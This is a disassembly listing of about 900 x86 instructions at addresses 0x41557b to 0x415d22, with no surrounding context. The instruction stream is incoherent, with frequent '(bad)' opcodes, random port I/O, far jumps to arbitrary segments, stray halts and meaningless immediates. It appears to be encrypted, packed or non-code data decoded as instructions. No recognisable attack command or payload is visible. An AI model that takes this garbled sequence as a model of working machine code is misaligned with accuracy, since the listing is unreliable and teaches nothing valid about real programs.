  41557b:	inc    edx
  41557c:	arpl   bx,ax
  41557e:	ja     0xad42c8ef
  415584:	add    dh,dh
  415586:	xlat   BYTE PTR ds:[ebx]
  415587:	inc    edx
  415588:	dec    edx
  415589:	leave  
  41558a:	imul   edx,DWORD PTR ds:0x411c6732,0xe242ed06
  415594:	mov    ebx,0xd6ccf8dc
  415599:	mov    ah,0xb1
  41559b:	mov    ch,BYTE PTR [esi]
  41559d:	rol    DWORD PTR [edi+0x2],1
  4155a0:	push   0x7dd9cc5b
  4155a5:	mov    dh,cl
  4155a7:	int3   
  4155a8:	scas   eax,DWORD PTR es:[edi]
  4155a9:	(bad)  
  4155aa:	and    edx,ebp
  4155ac:	cmp    dl,bh
  4155ae:	and    ah,ch
  4155b0:	(bad)  
  4155b1:	in     eax,0x92
  4155b3:	lods   al,BYTE PTR ds:[esi]
  4155b4:	fs mov eax,0x8e1d7fbc
  4155ba:	outs   dx,BYTE PTR ds:[esi]
  4155bb:	daa    
  4155bc:	imul   edx,DWORD PTR [eax+0x2e],0xf7fae327
  4155c3:	icebp  
  4155c4:	ins    DWORD PTR es:[edi],dx
  4155c5:	push   ds
  4155c6:	ins    DWORD PTR es:[edi],dx
  4155c7:	cdq    
  4155c8:	push   es
  4155c9:	push   es
  4155ca:	and    eax,0x1ef85e5d
  4155cf:	jo     0x415577
  4155d1:	and    al,0x40
  4155d3:	imul   BYTE PTR [eax-0x6add3abd]
  4155d9:	dec    ecx
  4155da:	sub    eax,0xd4632991
  4155df:	dec    ebx
  4155e0:	sub    al,BYTE PTR [esi-0x1]
  4155e3:	jecxz  0x415611
  4155e5:	repz dec cx
  4155e8:	add    eax,0x20e3f65b
  4155ed:	jle    0x415584
  4155ef:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4155f1:	sub    ebx,DWORD PTR ds:0xc301
  4155f6:	int3   
  4155f7:	les    esi,FWORD PTR [eax+edi*2-0x3f]
  4155fb:	pop    esp
  4155fc:	inc    ebx
  4155fd:	fidiv  WORD PTR [esi]
  4155ff:	cmp    al,0x91
  415601:	out    dx,al
  415602:	repz mov edi,0x325bb091
  415608:	adc    DWORD PTR [esi+0x0],esi
  41560b:	push   es
  41560c:	stos   DWORD PTR es:[edi],eax
  41560d:	out    dx,al
  41560e:	fld    TBYTE PTR [edi]
  415610:	test   al,0x31
  415612:	mov    al,ds:0x707803bc
  415617:	xlat   BYTE PTR ds:[ebx]
  415618:	pop    esp
  415619:	jno    0x415606
  41561b:	sbb    al,0x5d
  41561d:	and    eax,DWORD PTR [edx+0x28c0718a]
  415623:	xchg   BYTE PTR ds:0xff92e8c4,bh
  415629:	mov    edi,0x12046ce0
  41562e:	outs   dx,BYTE PTR ds:[esi]
  41562f:	sbb    bh,BYTE PTR [edx-0x37c74157]
  415635:	out    0x15,eax
  415637:	sar    BYTE PTR fs:[ecx+0x7b6cbb5a],1
  41563e:	mov    edi,0x96129c62
  415643:	shl    ah,1
  415645:	jp     0x41566a
  415647:	fistp  WORD PTR [eax-0x5d9959af]
  41564d:	rcl    BYTE PTR [ebp+0x56],1
  415650:	cmp    al,0x93
  415652:	in     eax,0x97
  415654:	sub    dl,ch
  415656:	xor    eax,0x74778602
  41565b:	fsubrp st(3),st
  41565d:	in     al,dx
  41565e:	mov    esp,0x13d27268
  415663:	jecxz  0x415609
  415665:	sahf   
  415666:	adc    eax,0x3a83371
  41566b:	push   esi
  41566c:	add    edx,DWORD PTR [edi-0x52341bb]
  415672:	outs   dx,DWORD PTR ds:[esi]
  415673:	hlt    
  415674:	mov    bl,0x4b
  415676:	fstp   DWORD PTR [ebx]
  415678:	loope  0x415618
  41567a:	mov    esp,0xf8efda19
  41567f:	jecxz  0x415661
  415681:	push   cs
  415682:	jae    0x415616
  415684:	inc    edi
  415685:	mov    esi,0xde6f2e46
  41568a:	lahf   
  41568b:	ins    BYTE PTR es:[edi],dx
  41568c:	sbb    DWORD PTR [esi+0x7f36a98e],eax
  415692:	jle    0x415648
  415694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415695:	cwde   
  415696:	and    al,0xbb
  415698:	push   0xbf884c90
  41569d:	inc    ebx
  41569e:	aad    0xda
  4156a0:	xor    DWORD PTR [edi],esi
  4156a2:	hlt    
  4156a3:	cmp    DWORD PTR [ebx-0x3e262253],ebx
  4156a9:	lahf   
  4156aa:	addr16 sti 
  4156ac:	xchg   ebx,eax
  4156ad:	ins    DWORD PTR es:[edi],dx
  4156ae:	idiv   BYTE PTR [edi-0x65]
  4156b1:	outs   dx,DWORD PTR ds:[esi]
  4156b2:	sub    edi,DWORD PTR ds:0x1bc857c8
  4156b8:	adc    al,0x75
  4156ba:	dec    edi
  4156bb:	pop    es
  4156bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156bd:	sub    al,0x31
  4156bf:	retf   0x436
  4156c2:	xchg   ecx,eax
  4156c3:	retf   
  4156c4:	hlt    
  4156c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156c6:	lods   al,BYTE PTR ds:[esi]
  4156c7:	aam    0x18
  4156c9:	or     cl,BYTE PTR [edi+0x7b]
  4156cc:	inc    ebx
  4156cd:	aam    0xda
  4156cf:	into   
  4156d0:	pop    ds
  4156d1:	cmc    
  4156d2:	adc    ecx,DWORD PTR [eax+0x42]
  4156d5:	push   es
  4156d6:	pop    eax
  4156d7:	mov    esi,0x1515b604
  4156dc:	pushf  
  4156dd:	dec    ebp
  4156de:	fsubr  DWORD PTR [ebp-0x6da7fb5d]
  4156e4:	add    cl,BYTE PTR [esi+ecx*1]
  4156e7:	clc    
  4156e8:	(bad)  
  4156e9:	outs   dx,BYTE PTR ds:[esi]
  4156ea:	pop    ss
  4156eb:	icebp  
  4156ec:	ja     0x4156d7
  4156ee:	loopne 0x415681
  4156f0:	sub    bh,BYTE PTR [edx-0x18eadb14]
  4156f6:	and    eax,0x452d448b
  4156fb:	scas   eax,DWORD PTR es:[edi]
  4156fc:	nop
  4156fd:	pusha  
  4156fe:	adc    BYTE PTR [ebx-0x519152de],ah
  415704:	mov    ds:0x5f35404,eax
  415709:	ins    BYTE PTR es:[edi],dx
  41570a:	sar    DWORD PTR [esi+0x60ea18f6],1
  415710:	std    
  415711:	mov    WORD PTR [ebx],?
  415713:	out    dx,al
  415714:	mov    ebp,DWORD PTR cs:[eax+0x3ad2d8b4]
  41571b:	jo     0x415752
  41571d:	mov    ah,0xc7
  41571f:	enter  0x72a3,0xb9
  415723:	sub    BYTE PTR fs:[ecx+0x43],dh
  415727:	sub    eax,DWORD PTR [eax]
  415729:	dec    ebp
  41572a:	push   ds
  41572b:	imul   esi,DWORD PTR [eax+0x563c73cf],0xffffffb0
  415732:	call   0xa844:0xe6a6d5fb
  415739:	inc    ecx
  41573a:	push   edx
  41573b:	xor    BYTE PTR [edx-0x7f],dl
  41573e:	aad    0x31
  415740:	push   0x4012158
  415745:	in     al,0xf3
  415747:	lods   al,BYTE PTR ds:[esi]
  415748:	jl     0x415791
  41574a:	mov    ch,0xce
  41574c:	sub    DWORD PTR [edi],0x8e06e327
  415752:	sub    eax,DWORD PTR [ecx+0x7f]
  415755:	outs   dx,DWORD PTR ds:[esi]
  415756:	jae    0x4157a2
  415758:	out    0xb4,eax
  41575a:	js     0x41575e
  41575c:	add    eax,0x63e72a38
  415761:	aad    0x15
  415763:	aas    
  415764:	mov    al,ds:0xca200042
  415769:	popa   
  41576a:	js     0x41574d
  41576c:	inc    edi
  41576d:	imul   edx,ebx,0xffffffab
  415770:	push   edi
  415771:	int3   
  415772:	adc    DWORD PTR [ebx+0x40],0x42
  415776:	rol    BYTE PTR [esi],0x23
  415779:	clc    
  41577a:	jp     0x4157dc
  41577c:	std    
  41577d:	mov    edi,0xfee67ca3
  415782:	push   es
  415783:	jge    0x415730
  415785:	mov    ebx,0x9420931f
  41578a:	pop    edi
  41578b:	pop    ebx
  41578c:	mov    esp,DWORD PTR [esi]
  41578e:	or     BYTE PTR [edi],dl
  415790:	enter  0xfa87,0xc3
  415794:	pop    edi
  415795:	add    eax,0xc26a6ebe
  41579a:	jno    0x41571f
  41579c:	in     eax,dx
  41579d:	pop    esi
  41579e:	cwde   
  41579f:	jo     0x415767
  4157a1:	xchg   edx,eax
  4157a2:	add    edi,esp
  4157a4:	out    0x4e,al
  4157a6:	in     eax,dx
  4157a7:	ds inc ebx
  4157a9:	mov    al,0x57
  4157ab:	loopne 0x4157ae
  4157ad:	aam    0x3b
  4157af:	test   eax,0x1ae84d50
  4157b4:	ret    
  4157b5:	out    0xcb,al
  4157b7:	pop    edi
  4157b8:	mov    ah,0x65
  4157ba:	into   
  4157bb:	in     al,0x22
  4157bd:	out    dx,al
  4157be:	sahf   
  4157bf:	jg     0x415838
  4157c1:	push   ebx
  4157c2:	loop   0x415796
  4157c4:	neg    esp
  4157c6:	fucom  st(3)
  4157c8:	les    esp,FWORD PTR [edx+0x7e]
  4157cb:	dec    edi
  4157cc:	outs   dx,BYTE PTR ds:[esi]
  4157cd:	xchg   esp,eax
  4157ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157cf:	call   0x7aa0:0x6d336781
  4157d6:	loop   0x41575c
  4157d8:	mov    edi,0x154425aa
  4157dd:	scas   al,BYTE PTR es:[edi]
  4157de:	cmp    eax,0x132936bf
  4157e3:	popf   
  4157e4:	cmp    BYTE PTR [ecx+eax*8],0x7d
  4157e8:	repnz out dx,eax
  4157ea:	nop
  4157eb:	mov    al,ds:0x7f444479
  4157f0:	sub    eax,0x475d03c
  4157f5:	jbe    0x415876
  4157f7:	loop   0x41583e
  4157f9:	scas   eax,DWORD PTR es:[edi]
  4157fa:	call   0xa5e03dc
  4157ff:	sar    DWORD PTR [ebp-0x7c21248b],cl
  415805:	cmp    BYTE PTR [ebp+ecx*8+0x3842debb],ch
  41580c:	mov    BYTE PTR [edi+edx*4],dh
  41580f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415810:	adc    BYTE PTR [ecx],bl
  415812:	dec    esi
  415813:	fadd   QWORD PTR [edx+0x76a6626]
  415819:	test   BYTE PTR [ebp+0x7a425fc1],0xd3
  415820:	push   edx
  415821:	pushw  es
  415823:	lock call 0xee4e:0x4c99940f
  41582b:	lahf   
  41582c:	xchg   ecx,eax
  41582d:	sbb    BYTE PTR ss:[eax+0x7e],al
  415831:	pop    ebp
  415832:	or     ebx,ebp
  415834:	xlat   BYTE PTR ds:[ebx]
  415835:	test   BYTE PTR [edi],bh
  415837:	and    al,0x10
  415839:	jmp    0x415861
  41583b:	loop   0x41583e
  41583d:	ins    DWORD PTR es:[edi],dx
  41583e:	xchg   edx,eax
  41583f:	pop    esi
  415840:	in     al,dx
  415841:	icebp  
  415842:	(bad)  
  415843:	dec    eax
  415844:	inc    esi
  415845:	leave  
  415846:	aaa    
  415847:	pop    ecx
  415848:	leave  
  415849:	popa   
  41584a:	ins    BYTE PTR es:[edi],dx
  41584b:	gs in  al,0x1a
  41584e:	dec    esi
  41584f:	pop    esi
  415850:	in     al,0x7
  415852:	xor    ebx,DWORD PTR [edx]
  415854:	sahf   
  415855:	bound  ecx,QWORD PTR [edi+0x1f]
  415858:	mov    WORD PTR [eax+0x3e],?
  41585b:	sbb    al,0x32
  41585d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41585e:	jns    0x41588a
  415860:	jge    0x415896
  415862:	mov    dh,0x9b
  415864:	lahf   
  415865:	test   eax,0x92981365
  41586a:	(bad)  
  41586b:	je     0x41582a
  41586d:	loopne 0x4158a8
  41586f:	ja     0x415823
  415871:	mov    ebx,0x2b9f5b2
  415876:	xchg   ebp,eax
  415877:	fisttp WORD PTR ds:0xb228dbe6
  41587d:	add    ah,BYTE PTR [ebx]
  41587f:	lock pusha 
  415881:	push   ds
  415882:	idiv   DWORD PTR [edx+0x24]
  415885:	or     cl,ch
  415887:	xchg   DWORD PTR [esi*2+0x32bc74d2],ebx
  41588e:	pop    ds
  41588f:	es jno 0x4158ca
  415892:	mov    ebp,0x5b5ad452
  415897:	xlat   BYTE PTR ds:[ebx]
  415898:	lods   al,BYTE PTR ds:[esi]
  415899:	push   eax
  41589a:	jmp    0xbf010f73
  41589f:	fcomp  DWORD PTR [ebx]
  4158a1:	jno    0x415912
  4158a3:	stos   DWORD PTR es:[edi],eax
  4158a4:	hlt    
  4158a5:	or     DWORD PTR [edx+0x1b50897c],ebx
  4158ab:	jns    0x4158a2
  4158ad:	lds    ebp,FWORD PTR [ebx+0x58191111]
  4158b3:	popa   
  4158b4:	lahf   
  4158b5:	push   esi
  4158b6:	adc    DWORD PTR [ebx],esp
  4158b8:	jecxz  0x415910
  4158ba:	fstp   DWORD PTR [esi]
  4158bc:	fwait
  4158bd:	jecxz  0x415868
  4158bf:	pop    edi
  4158c0:	sub    cl,bl
  4158c2:	jge    0x41587b
  4158c4:	jae    0x415880
  4158c6:	adc    eax,0xf5846016
  4158cb:	arpl   cx,bp
  4158cd:	sub    ah,0x8f
  4158d0:	push   0xb5f9e11c
  4158d5:	push   esi
  4158d6:	push   eax
  4158d7:	jne    0x415900
  4158d9:	sub    BYTE PTR es:[edx],bh
  4158dc:	push   0x17439c5b
  4158e1:	or     eax,0x6d165035
  4158e6:	push   es
  4158e7:	push   es
  4158e8:	cmp    dl,al
  4158ea:	fidivr WORD PTR [eax+0x154faf8c]
  4158f0:	sbb    al,0xeb
  4158f2:	mov    bh,0x3c
  4158f4:	push   eax
  4158f5:	pop    ecx
  4158f6:	adc    dh,BYTE PTR cs:[eax-0x37189af9]
  4158fd:	jne    0x4158ad
  4158ff:	adc    esi,esp
  415901:	stos   BYTE PTR es:[edi],al
  415902:	cs pushf 
  415904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415905:	(bad)  
  415906:	cmc    
  415907:	mov    ds:0x333483f0,eax
  41590c:	xor    DWORD PTR [eax-0x69],0x88aaa03d
  415913:	pop    esi
  415914:	sub    al,0x5
  415916:	cdq    
  415917:	cli    
  415918:	fs aam 0x56
  41591b:	sbb    BYTE PTR [edx-0x123511cd],bl
  415921:	jmp    0x4fbc:0x631ef3bd
  415928:	sub    DWORD PTR [ebp-0x6afb2680],edi
  41592e:	and    DWORD PTR [esp+eax*2],ecx
  415931:	nop
  415932:	sti    
  415933:	pushf  
  415934:	out    0xd3,al
  415936:	xor    BYTE PTR [ecx],0xfd
  415939:	or     DWORD PTR [esi],esp
  41593b:	iret   
  41593c:	xchg   edx,eax
  41593d:	fnstsw WORD PTR [ebx+edx*8-0x29]
  415941:	mov    ?,esi
  415943:	in     eax,0xbf
  415945:	out    dx,al
  415946:	jnp    0x41595e
  415948:	pop    edx
  415949:	out    0xdf,eax
  41594b:	mov    DWORD PTR [esi-0x230a292e],eax
  415951:	push   0x373c5481
  415956:	aas    
  415957:	sti    
  415958:	leave  
  415959:	pop    ds
  41595a:	call   FWORD PTR [ebp-0x3c]
  41595d:	jmp    0xcc44:0x4e9cf223
  415964:	pop    ecx
  415965:	push   ebx
  415966:	xchg   ebx,eax
  415967:	mov    dh,0x97
  415969:	and    DWORD PTR ds:0x8b34b518,eax
  41596f:	mov    ch,0x49
  415971:	or     eax,0x5030f5df
  415976:	inc    edi
  415977:	push   edi
  415978:	hlt    
  415979:	imul   ebx,DWORD PTR [ebx+ecx*4-0x3a],0xffffff86
  41597e:	cli    
  41597f:	in     eax,0xde
  415981:	mov    eax,0xa6991a76
  415986:	jmp    0x60fc:0x2936d976
  41598d:	dec    eax
  41598e:	ds jecxz 0x415951
  415991:	bnd jo 0x41594f
  415994:	push   ss
  415995:	loop   0x415966
  415997:	xchg   ebx,eax
  415998:	mov    eax,ds:0x2265d315
  41599d:	add    DWORD PTR [esi-0x69],edi
  4159a0:	add    al,0x1e
  4159a2:	jne    0x415990
  4159a4:	enter  0x60ba,0x2a
  4159a8:	xor    eax,0xab831a71
  4159ad:	mov    eax,ds:0xc501069e
  4159b2:	aam    0x48
  4159b4:	pusha  
  4159b5:	clc    
  4159b6:	data16 or al,dh
  4159b9:	inc    esi
  4159ba:	inc    edi
  4159bb:	jne    0x415952
  4159bd:	sub    BYTE PTR [edi-0x1aeb1e02],dl
  4159c3:	es mov ecx,0x4da641f3
  4159c9:	cwde   
  4159ca:	fidivr DWORD PTR [ebx+0xc]
  4159cd:	mov    edx,0xb1b83de
  4159d2:	or     DWORD PTR [ebx],esp
  4159d4:	(bad)  
  4159d5:	(bad)  
  4159d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159d8:	add    ebx,esp
  4159da:	call   0xafbc:0x72f0759b
  4159e1:	outs   dx,BYTE PTR ds:[esi]
  4159e2:	cmp    BYTE PTR [ebx],0x32
  4159e5:	mov    cl,0x66
  4159e7:	rol    DWORD PTR [ebp+0x29],cl
  4159ea:	test   BYTE PTR [ecx],0xf6
  4159ed:	mov    eax,esp
  4159ef:	popaw  
  4159f1:	jp     0x415986
  4159f3:	inc    ebx
  4159f4:	adc    eax,0x5663398a
  4159f9:	stos   BYTE PTR es:[edi],al
  4159fa:	lock dec esi
  4159fc:	sub    DWORD PTR [esi+0x3693278d],eax
  415a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a03:	mov    ds:0x3afcadcf,al
  415a08:	(bad)  
  415a09:	jmp    0x766e:0xdd19871d
  415a10:	mov    edi,0x5a70b4ac
  415a15:	out    0x17,al
  415a17:	imul   esp,DWORD PTR [edi+eax*4],0x74642c50
  415a1e:	rcr    BYTE PTR [ecx],1
  415a20:	mov    esi,0xbe75384f
  415a25:	jae    0x4159c1
  415a27:	and    esi,DWORD PTR [edi+0x6d]
  415a2a:	jbe    0x415a3a
  415a2c:	mov    ah,0xcc
  415a2e:	sti    
  415a2f:	gs fxam 
  415a32:	jnp    0x415a64
  415a34:	cli    
  415a35:	or     ecx,DWORD PTR [ecx]
  415a37:	test   BYTE PTR [ebx+0x7c],cl
  415a3a:	xchg   edx,eax
  415a3c:	mov    ebx,0xe77cf8d3
  415a41:	mov    ds:0xd70a86ee,al
  415a46:	imul   esp,DWORD PTR [edx-0x8],0x29
  415a4a:	rol    BYTE PTR [eax],1
  415a4c:	loope  0x415a4e
  415a4e:	outs   dx,DWORD PTR ds:[esi]
  415a4f:	(bad)  
  415a50:	neg    DWORD PTR [ebp+0x29]
  415a53:	pusha  
  415a54:	jns    0x415a38
  415a56:	test   BYTE PTR [ecx+edi*8-0x306a382e],dh
  415a5d:	push   0x44
  415a5f:	mov    dl,0xaa
  415a61:	mov    al,ds:0xcb74e868
  415a66:	clc    
  415a67:	lods   al,BYTE PTR ds:[esi]
  415a68:	dec    ebx
  415a69:	inc    edi
  415a6a:	out    dx,eax
  415a6b:	mov    edx,0x5bba0564
  415a70:	jbe    0x415a7f
  415a72:	adc    al,BYTE PTR [ecx-0x37d8944c]
  415a78:	or     al,BYTE PTR [ecx]
  415a7a:	ret    0xde45
  415a7d:	jle    0x415aaa
  415a7f:	jl     0x415a85
  415a81:	adc    dl,BYTE PTR [edx+0x61]
  415a84:	test   BYTE PTR [ebp+0x4c],bl
  415a87:	pushw  ss
  415a89:	sahf   
  415a8a:	shl    BYTE PTR [ebx+0x445ed18f],cl
  415a90:	lods   eax,DWORD PTR ds:[esi]
  415a91:	lods   eax,DWORD PTR ds:[esi]
  415a92:	mov    BYTE PTR [esi+edx*2+0x5db6c005],cl
  415a99:	test   DWORD PTR [edi+ebp*2-0x553987bd],edi
  415aa0:	dec    ebx
  415aa1:	or     BYTE PTR [edx],bh
  415aa3:	jbe    0x415a29
  415aa5:	jmp    0x415abd
  415aa7:	push   es
  415aa8:	and    al,0x62
  415aaa:	aaa    
  415aab:	jns    0x415a5e
  415aad:	sbb    ah,BYTE PTR [eax]
  415aaf:	add    DWORD PTR [ebx-0x391c4af3],edx
  415ab5:	dec    ebp
  415ab6:	jnp    0x415b23
  415ab8:	dec    edx
  415ab9:	call   0x20cfa7bc
  415abe:	jg     0x415b19
  415ac0:	sub    ah,bl
  415ac2:	ja     0x415aee
  415ac4:	xchg   ebx,ebx
  415ac6:	aam    0xe3
  415ac8:	(bad)  
  415ac9:	popa   
  415aca:	ins    BYTE PTR es:[edi],dx
  415acb:	ja     0x415abf
  415acd:	adc    ah,bl
  415acf:	stc    
  415ad0:	in     al,0x1d
  415ad2:	lods   al,BYTE PTR ds:[esi]
  415ad3:	repnz add ebx,DWORD PTR [ebx]
  415ad6:	iret   
  415ad7:	push   ebp
  415ad8:	sub    al,0xe6
  415ada:	cdq    
  415adb:	sti    
  415adc:	push   esi
  415add:	fld    QWORD PTR [ebx-0x212b6eba]
  415ae3:	icebp  
  415ae4:	outs   dx,BYTE PTR ds:[esi]
  415ae5:	xchg   esp,eax
  415ae6:	out    0x2f,eax
  415ae8:	push   ebx
  415ae9:	push   ebx
  415aea:	cld    
  415aeb:	jnp    0x415b43
  415aed:	lahf   
  415aee:	mov    al,BYTE PTR [ecx-0x650fceb4]
  415af4:	dec    esi
  415af5:	add    BYTE PTR [esi+0x6f4831b5],cl
  415afb:	xor    ebx,ecx
  415afd:	dec    eax
  415afe:	inc    edx
  415aff:	xchg   ecx,eax
  415b00:	or     ah,bh
  415b02:	popf   
  415b03:	bound  ebx,QWORD PTR [edi-0x2515cb70]
  415b09:	xlat   BYTE PTR ds:[ebx]
  415b0a:	hlt    
  415b0b:	dec    edi
  415b0c:	xor    al,0x36
  415b0e:	mov    ebp,0x77313c24
  415b13:	xchg   esp,eax
  415b14:	cmp    BYTE PTR [edi+0x288cd869],cl
  415b1a:	icebp  
  415b1b:	sub    dl,ah
  415b1d:	(bad)  
  415b1e:	sti    
  415b1f:	scas   al,BYTE PTR es:[edi]
  415b20:	adc    al,0xfb
  415b22:	mov    eax,ds:0x73b821ee
  415b27:	push   0xadd99673
  415b2c:	aam    0xdf
  415b2e:	jp     0x415b22
  415b30:	sbb    edx,DWORD PTR [edi+0x38efb65f]
  415b36:	or     ebp,ecx
  415b38:	mov    ah,0x57
  415b3a:	push   ecx
  415b3b:	pusha  
  415b3c:	adc    dl,BYTE PTR [ebx+0xe]
  415b3f:	push   edx
  415b40:	or     al,dh
  415b42:	mov    dl,0x11
  415b44:	bound  esi,QWORD PTR [ebp+0x6]
  415b47:	dec    eax
  415b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b49:	sub    edi,DWORD PTR [eax+0x16]
  415b4c:	cs loope 0x415b0a
  415b4f:	mov    dh,BYTE PTR [edi-0x488db932]
  415b55:	sbb    BYTE PTR [ebx],ah
  415b57:	rcr    DWORD PTR [ecx-0x78c3b520],0x11
  415b5e:	mov    edi,0x39f4dc6d
  415b63:	gs pusha 
  415b65:	dec    eax
  415b66:	ins    DWORD PTR es:[edi],dx
  415b67:	pop    ds
  415b68:	cmc    
  415b69:	scas   eax,DWORD PTR es:[edi]
  415b6a:	jp     0x415b4b
  415b6c:	mov    ah,0x35
  415b6e:	cwde   
  415b6f:	jae    0x415b28
  415b71:	and    ah,BYTE PTR [eax+0x24]
  415b74:	sub    BYTE PTR [esi+0x5eed384e],bh
  415b7a:	push   eax
  415b7b:	mov    ebx,0x7bb27ce8
  415b80:	adc    ebx,DWORD PTR [ebx]
  415b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b83:	xor    edx,DWORD PTR [ebp+ebp*4-0x1a]
  415b87:	inc    esp
  415b88:	out    0xe,eax
  415b8a:	or     DWORD PTR [eax+0x5542a293],0x62
  415b91:	sub    BYTE PTR [ebx+ecx*4-0x2b],al
  415b95:	cmp    ecx,DWORD PTR [ecx+ecx*8-0x26]
  415b99:	push   ebx
  415b9a:	mov    ah,0xd3
  415b9c:	push   edi
  415b9d:	je     0x415c09
  415b9f:	push   ss
  415ba0:	hlt    
  415ba1:	push   esp
  415ba2:	and    ah,BYTE PTR [edi-0x64]
  415ba5:	adc    DWORD PTR [eax+0x4],eax
  415ba8:	pop    ss
  415ba9:	out    0x67,al
  415bab:	mov    esp,0x45ed0c56
  415bb0:	xor    al,0x6d
  415bb2:	and    bl,dh
  415bb4:	rcl    BYTE PTR [edi+0x53],1
  415bb7:	sub    al,0x57
  415bb9:	dec    esi
  415bba:	adc    cl,BYTE PTR [ecx-0x4e5a9794]
  415bc0:	sar    BYTE PTR ds:0x701117ef,cl
  415bc6:	mov    ds:0x7b784ef,al
  415bcb:	jmp    0x59ce:0x93ccb2b6
  415bd2:	sbb    ebx,DWORD PTR [ebp-0x4bc04c8d]
  415bd8:	sub    ah,BYTE PTR [ebp-0x55]
  415bdb:	popf   
  415bdc:	xchg   ebx,eax
  415bdd:	jle    0x415b6e
  415bdf:	addr16 inc esi
  415be1:	imul   eax,DWORD PTR [ecx-0x1b],0x9617cac
  415be8:	pop    edi
  415be9:	test   BYTE PTR [ebx],cl
  415beb:	rcr    BYTE PTR [ecx-0x6b28a9cd],1
  415bf1:	in     al,0x40
  415bf3:	mov    ch,0x90
  415bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf6:	cmp    eax,0x9f691ea6
  415bfb:	ins    BYTE PTR es:[edi],dx
  415bfc:	mov    dl,0xfe
  415bfe:	pop    ds
  415bff:	xchg   DWORD PTR [edi],esi
  415c01:	in     eax,0x88
  415c03:	aas    
  415c04:	jecxz  0x415bcc
  415c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c07:	add    DWORD PTR [edx],eax
  415c09:	sub    esp,DWORD PTR [eax+edx*4+0x73416fe6]
  415c10:	popf   
  415c11:	and    eax,DWORD PTR [edi-0x5ba1661]
  415c17:	push   eax
  415c18:	arpl   si,di
  415c1a:	and    BYTE PTR [eax],dl
  415c1c:	pop    ds
  415c1d:	mov    bl,BYTE PTR [esi-0x7e067a8e]
  415c23:	(bad)  
  415c24:	scas   eax,DWORD PTR es:[edi]
  415c25:	jno    0x415c58
  415c27:	pop    ds
  415c28:	jbe    0x415bb0
  415c2a:	push   es
  415c2b:	jbe    0x415c3c
  415c2d:	jp     0x415c3b
  415c2f:	dec    ecx
  415c30:	push   esp
  415c31:	call   0xf91d:0x2b9df318
  415c38:	or     BYTE PTR [ebp-0x1f8795aa],ch
  415c3e:	int    0x72
  415c40:	mov    bh,0x53
  415c42:	sti    
  415c43:	mov    dh,0x75
  415c45:	cmp    al,0xac
  415c47:	xor    BYTE PTR [edi-0x542075a3],dh
  415c4d:	xchg   DWORD PTR [ebp+0x77],ebx
  415c50:	cmp    edx,eax
  415c52:	sbb    DWORD PTR [edi+0x6b18b002],esi
  415c58:	mov    ebx,edx
  415c5a:	out    dx,al
  415c5b:	and    edi,DWORD PTR [eax-0x24326d54]
  415c61:	in     al,0x27
  415c63:	push   ecx
  415c64:	fs sub BYTE PTR cs:[edi+0x6a],ch
  415c69:	stos   BYTE PTR es:[edi],al
  415c6a:	inc    eax
  415c6b:	sub    ebp,DWORD PTR [ebx]
  415c6d:	xchg   bl,dl
  415c6f:	rcr    DWORD PTR [edi-0x1f66f0d2],cl
  415c75:	pop    edx
  415c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c77:	lds    ebx,FWORD PTR ds:0xb59899c9
  415c7d:	lods   al,BYTE PTR ds:[esi]
  415c7e:	push   ebx
  415c7f:	test   al,0x55
  415c81:	jle    0x415c2b
  415c83:	repz aad 0xe8
  415c86:	cmp    ah,dl
  415c88:	inc    ecx
  415c89:	push   edi
  415c8a:	pop    ebp
  415c8b:	jg     0x415cda
  415c8d:	push   0xffffffb7
  415c8f:	retf   0x8966
  415c92:	test   BYTE PTR [ebx+0x260679d3],ch
  415c98:	in     eax,0x63
  415c9a:	xor    eax,0x62adbefa
  415c9f:	test   al,0x6e
  415ca1:	retf   
  415ca2:	out    dx,eax
  415ca3:	mov    gs,ebx
  415ca5:	push   ebp
  415ca6:	xchg   BYTE PTR [edi-0x55],ah
  415ca9:	out    dx,eax
  415caa:	retf   
  415cab:	xor    eax,0x861593f8
  415cb0:	mov    ds,WORD PTR [ebx]
  415cb2:	inc    edi
  415cb3:	pop    es
  415cb4:	sub    al,0x64
  415cb6:	sbb    BYTE PTR es:[eax],ah
  415cb9:	jno    0x415c7d
  415cbb:	and    BYTE PTR [ebp-0x1508ca1],dl
  415cc1:	adc    bl,BYTE PTR [ebp+0x5c]
  415cc4:	and    BYTE PTR [ebx-0x50],bl
  415cc7:	jmp    0x466:0xbfec42a9
  415cce:	ror    DWORD PTR [eax-0x11],0xcb
  415cd2:	fld    DWORD PTR [edi]
  415cd4:	xor    eax,0xe2b6127a
  415cd9:	and    BYTE PTR [ecx-0x3b],0x32
  415cdd:	and    eax,0xcdfdf9bf
  415ce2:	sti    
  415ce3:	inc    esi
  415ce4:	push   eax
  415ce5:	xchg   ebp,ebx
  415ce7:	verw   WORD PTR [eax+0x70]
  415ceb:	test   dl,bh
  415ced:	pop    esp
  415cee:	xchg   ecx,eax
  415cef:	out    dx,al
  415cf0:	pop    ebx
  415cf1:	arpl   bp,sp
  415cf3:	adc    ah,bh
  415cf5:	and    ecx,0x1c
  415cf8:	sub    al,0x14
  415cfa:	or     eax,0x2635fa0c
  415cff:	add    BYTE PTR [ecx],dh
  415d01:	int3   
  415d02:	xchg   BYTE PTR [ebx-0x35d1ce85],al
  415d08:	fcom   DWORD PTR [edi-0x340f7a56]
  415d0e:	push   0xb17e020a
  415d13:	fcom   DWORD PTR [edi]
  415d15:	daa    
  415d16:	sbb    ch,ah
  415d18:	clc    
  415d19:	stos   BYTE PTR es:[edi],al
  415d1a:	idiv   DWORD PTR [ebx]
  415d1c:	jge    0x415cd5
  415d1e:	repnz inc edx
  415d20:	mov    dh,0x9c
  415d22:	sti    
